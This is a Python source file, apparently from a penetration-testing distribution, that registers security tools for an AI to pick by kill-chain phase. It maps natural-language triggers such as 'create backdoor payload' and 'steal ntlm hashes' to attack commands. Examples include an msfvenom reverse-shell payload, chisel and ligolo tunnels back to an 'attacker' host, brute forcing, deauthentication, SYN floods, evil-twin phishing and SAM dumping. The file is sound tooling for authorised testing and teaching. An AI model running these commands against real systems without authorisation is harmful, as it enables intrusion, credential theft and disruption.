"""
Phoenix OS — Tool Registry
Structured catalog of all security tools available in Phoenix OS.
Each tool entry tells the AI: what it does, how to call it, what phase it belongs to,
and what natural-language triggers map to it.

Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone
"""

from typing import Optional

# ── Tool Entry Format ──────────────────────────────────────────────────────────
# {
#   "name":        str  — binary/command name
#   "description": str  — what it does (AI uses this for selection)
#   "phase":       str  — kill chain phase
#   "category":    str  — subcategory
#   "command":     str  — base CLI invocation template
#   "triggers":    list — NLP phrases that map to this tool
#   "output":      str  — output format: text | json | xml | pcap | binary
#   "sudo":        bool — requires sudo/root
#   "docs":        str  — quick usage example
# }

TOOL_REGISTRY = {

    # ══════════════════════════════════════════════════════════════
    # PHASE 1 — RECONNAISSANCE & OSINT
    # ══════════════════════════════════════════════════════════════

    "nmap": {
        "name": "nmap", "phase": "recon", "category": "port_scan",
        "description": "Network port scanner — discovers open ports, services, OS fingerprinting",
        "command": "nmap {flags} {target}",
        "triggers": ["scan ports", "port scan", "discover services", "nmap", "what ports are open",
                     "enumerate services", "network scan", "host discovery"],
        "output": "text", "sudo": True,
        "docs": "nmap -sV -sC -O -p- {target}  # Full service/version/OS scan",
    },
    "masscan": {
        "name": "masscan", "phase": "recon", "category": "port_scan",
        "description": "Fastest internet port scanner — millions of packets/sec, great for large ranges",
        "command": "masscan {target} -p{ports} --rate={rate}",
        "triggers": ["fast scan", "masscan", "scan entire range", "bulk port scan", "scan /16", "scan /24"],
        "output": "text", "sudo": True,
        "docs": "masscan 10.0.0.0/8 -p0-65535 --rate=100000",
    },
    "rustscan": {
        "name": "rustscan", "phase": "recon", "category": "port_scan",
        "description": "Ultra-fast port scanner written in Rust — finds open ports, passes them to nmap",
        "command": "rustscan -a {target} -- {nmap_flags}",
        "triggers": ["rustscan", "fast nmap", "quick port scan"],
        "output": "text", "sudo": False,
        "docs": "rustscan -a 10.10.10.1 -- -sV -sC",
    },
    "theharvester": {
        "name": "theHarvester", "phase": "recon", "category": "osint",
        "description": "OSINT tool — harvests emails, subdomains, IPs, URLs from public sources",
        "command": "theHarvester -d {domain} -b {sources}",
        "triggers": ["harvest emails", "find emails", "osint domain", "theharvester", "find subdomains",
                     "passive recon", "gather intel on domain"],
        "output": "text", "sudo": False,
        "docs": "theHarvester -d target.com -b google,bing,linkedin,shodan -l 500",
    },
    "amass": {
        "name": "amass", "phase": "recon", "category": "subdomain",
        "description": "In-depth DNS enumeration and attack surface mapping — best subdomain tool",
        "command": "amass enum -d {domain} {flags}",
        "triggers": ["enumerate subdomains", "amass", "find all subdomains", "subdomain enumeration",
                     "attack surface mapping"],
        "output": "text", "sudo": False,
        "docs": "amass enum -passive -d target.com -o subdomains.txt",
    },
    "subfinder": {
        "name": "subfinder", "phase": "recon", "category": "subdomain",
        "description": "Fast passive subdomain enumeration using multiple sources",
        "command": "subfinder -d {domain} -o {output}",
        "triggers": ["subfinder", "passive subdomain", "quick subdomains"],
        "output": "text", "sudo": False,
        "docs": "subfinder -d target.com -o subs.txt -all",
    },
    "dnsx": {
        "name": "dnsx", "phase": "recon", "category": "dns",
        "description": "Fast DNS resolver — bulk resolve subdomains, brute-force DNS records",
        "command": "dnsx -l {wordlist} -d {domain} {flags}",
        "triggers": ["dns resolve", "dnsx", "resolve subdomains", "dns brute force"],
        "output": "text", "sudo": False,
        "docs": "cat subs.txt | dnsx -resp -a -cname",
    },
    "dnsrecon": {
        "name": "dnsrecon", "phase": "recon", "category": "dns",
        "description": "DNS enumeration — zone transfers, brute force, reverse lookup, SRV records",
        "command": "dnsrecon -d {domain} -t {type}",
        "triggers": ["dns recon", "zone transfer", "dnsrecon", "dns enumeration", "reverse dns"],
        "output": "text", "sudo": False,
        "docs": "dnsrecon -d target.com -t axfr  # Try zone transfer",
    },
    "whatweb": {
        "name": "whatweb", "phase": "recon", "category": "web_fingerprint",
        "description": "Web technology fingerprinter — identifies CMS, frameworks, server, plugins",
        "command": "whatweb {url} {flags}",
        "triggers": ["fingerprint website", "identify technology", "whatweb", "what cms", "what framework",
                     "detect web tech", "identify server"],
        "output": "text", "sudo": False,
        "docs": "whatweb -a 3 https://target.com  # Aggression level 3",
    },
    "wafw00f": {
        "name": "wafw00f", "phase": "recon", "category": "web_fingerprint",
        "description": "WAF detection — identifies if a Web Application Firewall is present and which one",
        "command": "wafw00f {url}",
        "triggers": ["detect waf", "waf detection", "wafw00f", "firewall detection", "is there a waf"],
        "output": "text", "sudo": False,
        "docs": "wafw00f https://target.com -a  # Test all WAFs",
    },
    "httpx": {
        "name": "httpx", "phase": "recon", "category": "web_probe",
        "description": "Fast HTTP probing — finds live web servers, status codes, tech from a list",
        "command": "httpx -l {input} {flags}",
        "triggers": ["probe http", "find live hosts", "httpx", "check web servers", "alive subdomains"],
        "output": "text", "sudo": False,
        "docs": "cat subs.txt | httpx -status-code -title -tech-detect -o live.txt",
    },
    "eyewitness": {
        "name": "eyewitness", "phase": "recon", "category": "web_screenshot",
        "description": "Screenshots web interfaces — visual recon of all discovered web services",
        "command": "eyewitness --web -f {input} --no-prompt -d {output}",
        "triggers": ["screenshot websites", "eyewitness", "visual recon", "screenshot all web services"],
        "output": "binary", "sudo": False,
        "docs": "eyewitness --web -f urls.txt -d screenshots/",
    },
    "shodan": {
        "name": "shodan", "phase": "recon", "category": "osint",
        "description": "Shodan CLI — search internet-exposed devices, get host info, CVEs",
        "command": "shodan {subcommand} {query}",
        "triggers": ["shodan search", "search shodan", "find exposed services", "internet exposed",
                     "shodan host info"],
        "output": "json", "sudo": False,
        "docs": "shodan host 1.2.3.4  |  shodan search 'apache 2.4 country:US'",
    },
    "metagoofil": {
        "name": "metagoofil", "phase": "recon", "category": "osint",
        "description": "Extracts metadata from public documents (PDF, DOCX, XLSX) — leaks usernames, paths",
        "command": "metagoofil -d {domain} -t {filetypes} -l {limit} -o {output}",
        "triggers": ["extract metadata", "document metadata", "metagoofil", "find usernames in docs",
                     "leaked metadata"],
        "output": "text", "sudo": False,
        "docs": "metagoofil -d target.com -t pdf,doc,xls -l 100 -o /tmp/meta/",
    },
    "recon-ng": {
        "name": "recon-ng", "phase": "recon", "category": "osint_framework",
        "description": "Full-featured OSINT framework with modules for passive intel gathering",
        "command": "recon-ng",
        "triggers": ["recon-ng", "osint framework", "modular recon", "gather intelligence"],
        "output": "text", "sudo": False,
        "docs": "recon-ng  # Interactive; use marketplace install all; modules/recon/...",
    },
    "spiderfoot": {
        "name": "spiderfoot", "phase": "recon", "category": "osint_framework",
        "description": "Automated OSINT collection — 200+ modules, finds IPs, domains, emails, leaked creds",
        "command": "spiderfoot -s {target} -t {modules} -o {output}",
        "triggers": ["spiderfoot", "automated osint", "full osint scan", "intelligence gathering"],
        "output": "json", "sudo": False,
        "docs": "spiderfoot -s target.com -o json -t INTERNET_NAME,EMAILADDR",
    },

    # ══════════════════════════════════════════════════════════════
    # PHASE 2 — SCANNING & VULNERABILITY ANALYSIS
    # ══════════════════════════════════════════════════════════════

    "nikto": {
        "name": "nikto", "phase": "scanning", "category": "web_vuln",
        "description": "Web server scanner — finds outdated software, dangerous files, misconfigurations",
        "command": "nikto -h {url} {flags}",
        "triggers": ["web vulnerability scan", "nikto", "scan web server", "find web vulnerabilities",
                     "web server audit"],
        "output": "text", "sudo": False,
        "docs": "nikto -h https://target.com -Tuning 1234567890 -o nikto.txt",
    },
    "nuclei": {
        "name": "nuclei", "phase": "scanning", "category": "template_scan",
        "description": "Template-based vulnerability scanner — 9000+ templates for CVEs, misconfigs, exposures",
        "command": "nuclei -u {url} {flags}",
        "triggers": ["nuclei scan", "template scan", "cve scan", "vulnerability templates",
                     "nuclei", "check for cves", "scan for known vulns"],
        "output": "text", "sudo": False,
        "docs": "nuclei -u https://target.com -t cves/ -t exposures/ -severity critical,high",
    },
    "openvas": {
        "name": "gvm-cli", "phase": "scanning", "category": "vuln_mgmt",
        "description": "OpenVAS/GVM — enterprise vulnerability scanner with CVE database",
        "command": "gvm-cli socket --gmp-username admin --gmp-password admin --xml {xml_cmd}",
        "triggers": ["openvas", "gvm scan", "enterprise vuln scan", "full vulnerability assessment"],
        "output": "xml", "sudo": False,
        "docs": "gvm-cli socket --xml '<get_tasks/>'  # List all tasks",
    },
    "wpscan": {
        "name": "wpscan", "phase": "scanning", "category": "cms_scan",
        "description": "WordPress security scanner — finds vulnerable plugins, themes, user enumeration",
        "command": "wpscan --url {url} {flags}",
        "triggers": ["scan wordpress", "wpscan", "wordpress vuln", "wp plugins", "wordpress audit",
                     "enumerate wordpress users"],
        "output": "text", "sudo": False,
        "docs": "wpscan --url https://target.com --enumerate u,p,t --api-token {TOKEN}",
    },
    "joomscan": {
        "name": "joomscan", "phase": "scanning", "category": "cms_scan",
        "description": "Joomla vulnerability scanner — finds outdated versions, extensions, admin panels",
        "command": "joomscan -u {url}",
        "triggers": ["scan joomla", "joomscan", "joomla audit"],
        "output": "text", "sudo": False,
        "docs": "joomscan -u https://target.com -ec",
    },
    "lynis": {
        "name": "lynis", "phase": "scanning", "category": "system_audit",
        "description": "System hardening auditor — audits local Linux/Unix systems for security issues",
        "command": "lynis audit system",
        "triggers": ["system audit", "lynis", "linux hardening", "security audit local",
                     "audit this system", "check system security"],
        "output": "text", "sudo": True,
        "docs": "lynis audit system --quick  # Full system security audit",
    },
    "checksec": {
        "name": "checksec", "phase": "scanning", "category": "binary_audit",
        "description": "Checks binary security properties — NX, RELRO, PIE, stack canaries, ASLR",
        "command": "checksec --file={binary}",
        "triggers": ["check binary protections", "checksec", "binary security", "nx bit", "pie check",
                     "stack canary check", "binary exploit mitigations"],
        "output": "text", "sudo": False,
        "docs": "checksec --file=/usr/bin/target_binary",
    },
    "sslscan": {
        "name": "sslscan", "phase": "scanning", "category": "ssl_audit",
        "description": "SSL/TLS scanner — finds weak ciphers, heartbleed, protocol version issues",
        "command": "sslscan {host}:{port}",
        "triggers": ["ssl scan", "tls audit", "sslscan", "check ssl", "ssl vulnerabilities",
                     "weak ciphers", "heartbleed check"],
        "output": "text", "sudo": False,
        "docs": "sslscan --show-certificate target.com:443",
    },

    # ══════════════════════════════════════════════════════════════
    # PHASE 3 — EXPLOITATION
    # ══════════════════════════════════════════════════════════════

    "metasploit": {
        "name": "msfconsole", "phase": "exploitation", "category": "framework",
        "description": "Metasploit Framework — world's most used exploitation platform, 2000+ exploits",
        "command": "msfconsole -q -x '{commands}'",
        "triggers": ["metasploit", "msf", "msfconsole", "run exploit", "exploit with metasploit",
                     "launch exploit", "use module", "meterpreter"],
        "output": "text", "sudo": False,
        "docs": "msfconsole -q -x 'use exploit/...; set RHOSTS x.x.x.x; run'",
    },
    "msfvenom": {
        "name": "msfvenom", "phase": "exploitation", "category": "payload_gen",
        "description": "Payload generator — creates reverse shells, stagers for all platforms",
        "command": "msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format} -o {output}",
        "triggers": ["generate payload", "msfvenom", "create reverse shell payload", "make shellcode",
                     "generate stager", "create backdoor payload"],
        "output": "binary", "sudo": False,
        "docs": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe",
    },
    "sqlmap": {
        "name": "sqlmap", "phase": "exploitation", "category": "injection",
        "description": "Automated SQL injection — detects and exploits SQLi in web apps, dumps databases",
        "command": "sqlmap -u {url} {flags}",
        "triggers": ["sql injection", "sqlmap", "dump database", "exploit sqli", "test for sqli",
                     "blind sql injection", "enumerate database"],
        "output": "text", "sudo": False,
        "docs": "sqlmap -u 'https://target.com/page?id=1' --dbs --batch --level=5 --risk=3",
    },
    "commix": {
        "name": "commix", "phase": "exploitation", "category": "injection",
        "description": "Command injection exploiter — finds and exploits OS command injection in web apps",
        "command": "commix --url={url} {flags}",
        "triggers": ["command injection", "commix", "os injection", "rce via injection"],
        "output": "text", "sudo": False,
        "docs": "commix --url='https://target.com/ping?ip=127.0.0.1' --level=3",
    },
    "xsser": {
        "name": "xsser", "phase": "exploitation", "category": "injection",
        "description": "XSS exploitation framework — detects and exploits cross-site scripting vulnerabilities",
        "command": "xsser --url {url} {flags}",
        "triggers": ["xss attack", "cross site scripting", "xsser", "exploit xss"],
        "output": "text", "sudo": False,
        "docs": "xsser --url 'https://target.com/search?q=' -p '<script>alert(1)</script>' --auto",
    },
    "beef": {
        "name": "beef-xss", "phase": "exploitation", "category": "browser",
        "description": "Browser Exploitation Framework — hooks browsers via XSS and controls them remotely",
        "command": "beef-xss",
        "triggers": ["beef", "browser exploit", "hook browser", "beef-xss", "browser hacking"],
        "output": "text", "sudo": False,
        "docs": "beef-xss  # Start on :3000 UI; inject hook.js via XSS payload",
    },
    "pwntools": {
        "name": "pwn", "phase": "exploitation", "category": "binary_exploit",
        "description": "Python binary exploitation library — buffer overflows, ROP chains, shellcode",
        "command": "python3 -c 'from pwn import *; ...'",
        "triggers": ["binary exploit", "buffer overflow", "pwntools", "rop chain", "shellcode",
                     "ret2libc", "format string exploit"],
        "output": "text", "sudo": False,
        "docs": "from pwn import *; p = process('./vuln'); p.sendline(b'A'*64 + p64(win_addr))",
    },

    # ══════════════════════════════════════════════════════════════
    # PHASE 4 — WEB APPLICATION ATTACKS
    # ══════════════════════════════════════════════════════════════

    "burpsuite": {
        "name": "burpsuite", "phase": "web_attacks", "category": "proxy",
        "description": "Web application security testing proxy — intercept, modify, replay HTTP traffic",
        "command": "burpsuite",
        "triggers": ["burp suite", "burpsuite", "intercept traffic", "web proxy", "burp",
                     "replay request", "modify http"],
        "output": "text", "sudo": False,
        "docs": "burpsuite  # Start GUI; configure browser proxy to 127.0.0.1:8080",
    },
    "zaproxy": {
        "name": "zaproxy", "phase": "web_attacks", "category": "proxy",
        "description": "OWASP ZAP — open-source web scanner and intercepting proxy",
        "command": "zaproxy {flags}",
        "triggers": ["zap", "zaproxy", "owasp zap", "zap scan"],
        "output": "text", "sudo": False,
        "docs": "zaproxy -daemon -host 0.0.0.0 -port 8090 -config api.key=YOURKEY",
    },
    "ffuf": {
        "name": "ffuf", "phase": "web_attacks", "category": "fuzzing",
        "description": "Fast web fuzzer — directory brute-force, parameter fuzzing, virtual host discovery",
        "command": "ffuf -u {url}/FUZZ -w {wordlist} {flags}",
        "triggers": ["directory brute force", "ffuf", "fuzz directories", "web fuzzing",
                     "find hidden directories", "find hidden files", "fuzz parameters",
                     "vhost fuzzing"],
        "output": "text", "sudo": False,
        "docs": "ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302",
    },
    "gobuster": {
        "name": "gobuster", "phase": "web_attacks", "category": "fuzzing",
        "description": "Directory/DNS/vhost busting tool — fast Go-based brute-forcer",
        "command": "gobuster {mode} -u {url} -w {wordlist} {flags}",
        "triggers": ["gobuster", "bust directories", "dir scan", "dns bust"],
        "output": "text", "sudo": False,
        "docs": "gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt",
    },
    "feroxbuster": {
        "name": "feroxbuster", "phase": "web_attacks", "category": "fuzzing",
        "description": "Recursive fast content discovery — finds hidden endpoints automatically",
        "command": "feroxbuster -u {url} -w {wordlist} {flags}",
        "triggers": ["feroxbuster", "recursive directory scan", "deep directory brute force"],
        "output": "text", "sudo": False,
        "docs": "feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 3",
    },
    "wfuzz": {
        "name": "wfuzz", "phase": "web_attacks", "category": "fuzzing",
        "description": "Web fuzzer — parameter fuzzing, auth bypass, hidden content discovery",
        "command": "wfuzz -c -z file,{wordlist} --hc 404 {url}/FUZZ",
        "triggers": ["wfuzz", "parameter fuzz", "fuzz login", "brute force parameters"],
        "output": "text", "sudo": False,
        "docs": "wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d 'pass=FUZZ&user=admin' --hc 302 https://target.com/login",
    },
    "mitmproxy": {
        "name": "mitmproxy", "phase": "web_attacks", "category": "proxy",
        "description": "Interactive TLS-capable proxy — inspect/modify HTTP/HTTPS traffic in real time",
        "command": "mitmproxy {flags}",
        "triggers": ["mitmproxy", "intercept https", "mitm proxy", "tls proxy"],
        "output": "text", "sudo": False,
        "docs": "mitmproxy --listen-port 8080  # Or: mitmdump -w outfile for capture",
    },
    "jwt_tool": {
        "name": "jwt_tool", "phase": "web_attacks", "category": "auth",
        "description": "JWT attack toolkit — test and exploit JWT tokens (alg:none, RS/HS confusion, bruteforce)",
        "command": "python3 /opt/tools/jwt_tool/jwt_tool.py {token} {flags}",
        "triggers": ["jwt attack", "jwt exploit", "jwt_tool", "json web token attack",
                     "algorithm confusion", "none algorithm", "jwt brute force"],
        "output": "text", "sudo": False,
        "docs": "jwt_tool.py eyJ... -T  # Tamper mode;  -X a  # Test alg:none",
    },

    # ══════════════════════════════════════════════════════════════
    # PHASE 5 — PASSWORD ATTACKS
    # ══════════════════════════════════════════════════════════════

    "hashcat": {
        "name": "hashcat", "phase": "password", "category": "cracking",
        "description": "GPU-accelerated hash cracker — cracks MD5, NTLM, bcrypt, SHA-256 and 300+ others",
        "command": "hashcat -m {mode} {hashfile} {wordlist} {flags}",
        "triggers": ["crack hash", "hashcat", "brute force hash", "crack password",
                     "ntlm crack", "md5 crack", "crack ntlm", "password cracking"],
        "output": "text", "sudo": False,
        "docs": "hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule",
    },
    "john": {
        "name": "john", "phase": "password", "category": "cracking",
        "description": "John the Ripper — password cracker with many hash formats, rule-based attacks",
        "command": "john {hashfile} {flags}",
        "triggers": ["john the ripper", "john", "crack with john", "crack shadow file",
                     "crack /etc/shadow"],
        "output": "text", "sudo": False,
        "docs": "john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashes.txt",
    },
    "hydra": {
        "name": "hydra", "phase": "password", "category": "online_attack",
        "description": "Online password brute forcer — SSH, FTP, HTTP, SMB, RDP, MySQL and 50+ protocols",
        "command": "hydra -l {user} -P {wordlist} {target} {service}",
        "triggers": ["brute force login", "hydra", "brute force ssh", "brute force ftp",
                     "password spray", "credential stuffing", "brute force rdp",
                     "brute force http", "online password attack"],
        "output": "text", "sudo": False,
        "docs": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh -t 4",
    },
    "medusa": {
        "name": "medusa", "phase": "password", "category": "online_attack",
        "description": "Parallel online password brute forcer — faster than Hydra for some protocols",
        "command": "medusa -h {host} -u {user} -P {wordlist} -M {module}",
        "triggers": ["medusa", "fast brute force", "parallel brute force"],
        "output": "text", "sudo": False,
        "docs": "medusa -h 10.10.10.10 -u admin -P rockyou.txt -M ssh",
    },
    "crunch": {
        "name": "crunch", "phase": "password", "category": "wordlist_gen",
        "description": "Wordlist generator — creates custom wordlists by pattern, character set, length",
        "command": "crunch {min} {max} {charset} -o {output}",
        "triggers": ["generate wordlist", "crunch", "create wordlist", "custom wordlist",
                     "generate passwords by pattern"],
        "output": "text", "sudo": False,
        "docs": "crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt",
    },
    "cupp": {
        "name": "cupp", "phase": "password", "category": "wordlist_gen",
        "description": "Common User Passwords Profiler — generates target-specific wordlists from personal info",
        "command": "python3 cupp.py -i",
        "triggers": ["cupp", "targeted wordlist", "personal info wordlist", "profile password list"],
        "output": "text", "sudo": False,
        "docs": "cupp -i  # Interactive mode — enter victim's info, generates custom list",
    },
    "hash-identifier": {
        "name": "hash-identifier", "phase": "password", "category": "hash_id",
        "description": "Identifies hash type from a hash string — tells you what -m to use in hashcat",
        "command": "hash-identifier",
        "triggers": ["identify hash", "what hash type", "hash identifier", "hashid",
                     "what kind of hash is this", "identify hash type"],
        "output": "text", "sudo": False,
        "docs": "echo '5f4dcc3b5aa765d61d8327deb882cf99' | hash-identifier",
    },

    # ══════════════════════════════════════════════════════════════
    # PHASE 6 — WIRELESS ATTACKS
    # ══════════════════════════════════════════════════════════════

    "aircrack-ng": {
        "name": "aircrack-ng", "phase": "wireless", "category": "wifi_crack",
        "description": "WiFi WEP/WPA/WPA2 cracking suite — capture handshakes and crack PSKs",
        "command": "aircrack-ng {capfile} -w {wordlist}",
        "triggers": ["crack wifi", "wpa handshake", "aircrack", "crack wpa2", "wifi password",
                     "break wifi", "crack wifi password"],
        "output": "text", "sudo": True,
        "docs": "aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt",
    },
    "airodump-ng": {
        "name": "airodump-ng", "phase": "wireless", "category": "wifi_capture",
        "description": "Captures 802.11 frames — discovers APs, clients, captures WPA handshakes",
        "command": "airodump-ng {interface} {flags}",
        "triggers": ["capture wifi", "airodump", "find access points", "scan wifi networks",
                     "capture handshake", "monitor mode capture", "wifi discovery"],
        "output": "pcap", "sudo": True,
        "docs": "airodump-ng wlan1mon --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture",
    },
    "aireplay-ng": {
        "name": "aireplay-ng", "phase": "wireless", "category": "wifi_attack",
        "description": "WiFi packet injector — deauth attacks, fake auth, ARP replay to force handshakes",
        "command": "aireplay-ng {attack_mode} {interface} {flags}",
        "triggers": ["deauth attack", "deauthenticate clients", "aireplay", "wifi injection",
                     "kick clients", "disconnect wifi clients", "force handshake",
                     "deauth all clients", "kick off wifi", "wifi deauth"],
        "output": "text", "sudo": True,
        "docs": "aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan1mon  # 10 deauth packets",
    },
    "wifite2": {
        "name": "wifite", "phase": "wireless", "category": "wifi_auto",
        "description": "Automated WiFi attack tool — auto targets WEP/WPA/WPS networks, captures/cracks",
        "command": "wifite {flags}",
        "triggers": ["wifite", "automated wifi attack", "auto crack wifi", "wifi attack all"],
        "output": "text", "sudo": True,
        "docs": "wifite --wpa --dict /usr/share/wordlists/rockyou.txt",
    },
    "wifiphisher": {
        "name": "wifiphisher", "phase": "wireless", "category": "evil_twin",
        "description": "Evil twin / rogue AP attack — phishes WiFi credentials via fake captive portal",
        "command": "wifiphisher {flags}",
        "triggers": ["evil twin", "rogue access point", "wifiphisher", "wifi phishing",
                     "fake captive portal", "steal wifi credentials"],
        "output": "text", "sudo": True,
        "docs": "wifiphisher -aI wlan1 -jI wlan0 -p firmware-upgrade --handshake-capture capture.cap",
    },
    "bettercap": {
        "name": "bettercap", "phase": "wireless", "category": "network_attack",
        "description": "Swiss-army knife for network attacks — ARP spoofing, BLE sniff, WiFi scanning, MITM",
        "command": "bettercap {flags}",
        "triggers": ["bettercap", "arp spoof", "arp poisoning", "mitm attack", "ble sniff",
                     "network mitm", "intercept network traffic", "ssl strip"],
        "output": "text", "sudo": True,
        "docs": "bettercap -iface eth0  # Then: set arp.spoof.targets 10.0.0.1; arp.spoof on",
    },
    "kismet": {
        "name": "kismet", "phase": "wireless", "category": "wifi_recon",
        "description": "Wireless network detector/sniffer/IDS — passive WiFi, Bluetooth, Zigbee capture",
        "command": "kismet --no-ncurses {flags}",
        "triggers": ["kismet", "passive wifi scan", "wireless ids", "wifi sniffer",
                     "detect all wireless", "wireless recon"],
        "output": "text", "sudo": True,
        "docs": "kismet -c wlan1  # Web UI on :2501; capture source handles monitor mode",
    },
    "hostapd-wpe": {
        "name": "hostapd-wpe", "phase": "wireless", "category": "evil_twin",
        "description": "Rogue AP for WPA-Enterprise / PEAP attacks — captures NTLM hashes from EAP",
        "command": "hostapd-wpe {config}",
        "triggers": ["peap attack", "wpa enterprise attack", "hostapd-wpe", "eap attack",
                     "rogue radius", "capture eap credentials"],
        "output": "text", "sudo": True,
        "docs": "hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf  # Then crack captured NTLM",
    },
    "eaphammer": {
        "name": "eaphammer", "phase": "wireless", "category": "evil_twin",
        "description": "WPA-Enterprise attack tool — targeted evil twin, PEAP/TTLS credential theft",
        "command": "python3 /opt/tools/eaphammer/eaphammer {flags}",
        "triggers": ["eaphammer", "wpa enterprise evil twin", "steal eap credentials",
                     "targeted evil twin"],
        "output": "text", "sudo": True,
        "docs": "eaphammer -i wlan1 --channel 6 --auth wpa-eap --essid CorpWifi --creds",
    },

    # ══════════════════════════════════════════════════════════════
    # PHASE 7 — NETWORK ATTACKS & MitM
    # ══════════════════════════════════════════════════════════════

    "responder": {
        "name": "responder", "phase": "network", "category": "credential_capture",
        "description": "LLMNR/NBT-NS/mDNS poisoner — captures NTLMv2 hashes from Windows hosts on LAN",
        "command": "python3 /opt/tools/Responder/Responder.py -I {interface} {flags}",
        "triggers": ["responder", "llmnr poisoning", "capture ntlm hashes", "nbns poisoning",
                     "steal ntlm hashes", "credential capture lan", "ntlm relay setup",
                     "dump ntlm hashes", "capture hashes lan", "ntlm capture"],
        "output": "text", "sudo": True,
        "docs": "Responder.py -I eth0 -wrd  # Listen; hashes saved to logs/",
    },
    "ettercap": {
        "name": "ettercap", "phase": "network", "category": "mitm",
        "description": "Network MITM tool — ARP poisoning, traffic interception, plugin-based attacks",
        "command": "ettercap -T -M arp:remote /{target1}// /{target2}// {flags}",
        "triggers": ["ettercap", "arp poison", "man in the middle", "network interception",
                     "intercept between two hosts"],
        "output": "text", "sudo": True,
        "docs": "ettercap -G  # GUI mode;  -T -q for quiet terminal mode",
    },
    "scapy": {
        "name": "scapy", "phase": "network", "category": "packet_craft",
        "description": "Python packet manipulation library — craft, send, capture any network packet",
        "command": "python3 -c 'from scapy.all import *; ...'",
        "triggers": ["scapy", "craft packets", "custom packets", "raw packet", "forge packets",
                     "packet injection", "build network packet"],
        "output": "text", "sudo": True,
        "docs": "from scapy.all import *; pkt = IP(dst='10.10.10.10')/ICMP(); send(pkt)",
    },
    "hping3": {
        "name": "hping3", "phase": "network", "category": "packet_craft",
        "description": "TCP/IP packet assembler/analyzer — port scan, DoS, firewall testing, traceroute",
        "command": "hping3 {flags} {target}",
        "triggers": ["hping3", "tcp ping", "syn flood test", "custom icmp", "stealth scan hping"],
        "output": "text", "sudo": True,
        "docs": "hping3 -S --flood -V -p 80 10.10.10.10  # SYN flood test",
    },
    "mitm6": {
        "name": "mitm6", "phase": "network", "category": "ipv6_attack",
        "description": "IPv6 MITM attack — hijacks DNS via DHCPv6 on Windows networks, works with ntlmrelayx",
        "command": "python3 /opt/tools/mitm6/mitm6.py -d {domain} {flags}",
        "triggers": ["mitm6", "ipv6 attack", "dhcpv6 attack", "ipv6 poisoning",
                     "ipv6 mitm", "ntlm relay via ipv6"],
        "output": "text", "sudo": True,
        "docs": "mitm6 -d corp.local  # Pair with: ntlmrelayx.py -6 -t https://target -wh wpad.corp.local",
    },
    "chisel": {
        "name": "chisel", "phase": "network", "category": "tunneling",
        "description": "TCP/UDP tunnel over HTTP with SSH encryption — port forwarding through firewalls",
        "command": "chisel {mode} {flags}",
        "triggers": ["chisel tunnel", "port forward", "tunnel through firewall", "http tunnel",
                     "pivot port forward", "expose internal port"],
        "output": "text", "sudo": False,
        "docs": "# Server: chisel server -p 8888 --reverse  |  Client: chisel client attacker:8888 R:3306:127.0.0.1:3306",
    },
    "sshuttle": {
        "name": "sshuttle", "phase": "network", "category": "pivoting",
        "description": "VPN over SSH — route all traffic through a compromised host transparently",
        "command": "sshuttle -r {user}@{host} {subnets}",
        "triggers": ["sshuttle", "route through ssh", "vpn over ssh", "pivot all traffic",
                     "transparent proxy ssh"],
        "output": "text", "sudo": True,
        "docs": "sshuttle -r kali@10.10.10.10 10.0.0.0/8 --ssh-cmd 'ssh -i id_rsa'",
    },
    "proxychains": {
        "name": "proxychains4", "phase": "network", "category": "pivoting",
        "description": "Route any TCP tool through proxy chains — SOCKS4/5, HTTP, Tor",
        "command": "proxychains4 {tool} {args}",
        "triggers": ["proxychains", "route through proxy", "socks proxy", "tor proxy",
                     "chain proxies", "anonymous routing"],
        "output": "text", "sudo": False,
        "docs": "proxychains4 nmap -sT -Pn 10.10.10.1  # TCP connect scan through chain",
    },
    "ligolo-ng": {
        "name": "ligolo-ng", "phase": "network", "category": "pivoting",
        "description": "Advanced tunneling/pivoting tool — TUN interface for full network access through target",
        "command": "/opt/tools/ligolo-ng/proxy {flags}",
        "triggers": ["ligolo", "ligolo-ng", "create tunnel interface", "pivot with tun",
                     "full network pivot"],
        "output": "text", "sudo": True,
        "docs": "# Attacker: proxy -selfcert  |  Target: agent -connect attacker:11601 -ignore-cert",
    },

    # ══════════════════════════════════════════════════════════════
    # PHASE 8 — ACTIVE DIRECTORY & WINDOWS
    # ══════════════════════════════════════════════════════════════

    "crackmapexec": {
        "name": "crackmapexec", "phase": "active_directory", "category": "ad_attack",
        "description": "Swiss army knife for Windows/AD pentesting — spray, enum, exec, dump, lateral movement",
        "command": "crackmapexec {protocol} {target} {flags}",
        "triggers": ["crackmapexec", "cme", "smb enum", "password spray ad", "lateral movement windows",
                     "enumerate shares", "dump sam", "check admin", "wmi exec", "winrm exec",
                     "spray credentials", "test credentials"],
        "output": "text", "sudo": False,
        "docs": "crackmapexec smb 10.10.10.0/24 -u admin -p Password1 --shares --sam",
    },
    "bloodhound": {
        "name": "bloodhound", "phase": "active_directory", "category": "ad_enum",
        "description": "AD attack path visualization — finds paths to Domain Admin via graph analysis",
        "command": "bloodhound",
        "triggers": ["bloodhound", "attack path", "domain admin path", "ad graph", "find da path",
                     "ad attack paths", "shortest path to domain admin"],
        "output": "text", "sudo": False,
        "docs": "# Collect: bloodhound-python -u user -p pass -d corp.local -ns DC_IP -c All  |  Import to BloodHound UI",
    },
    "impacket": {
        "name": "impacket", "phase": "active_directory", "category": "ad_attack",
        "description": "Python AD attack toolkit — secretsdump, psexec, wmiexec, kerberoast, AS-REP roast",
        "command": "impacket-{tool} {flags}",
        "triggers": ["impacket", "secretsdump", "dump ntds", "psexec", "wmiexec", "smbexec",
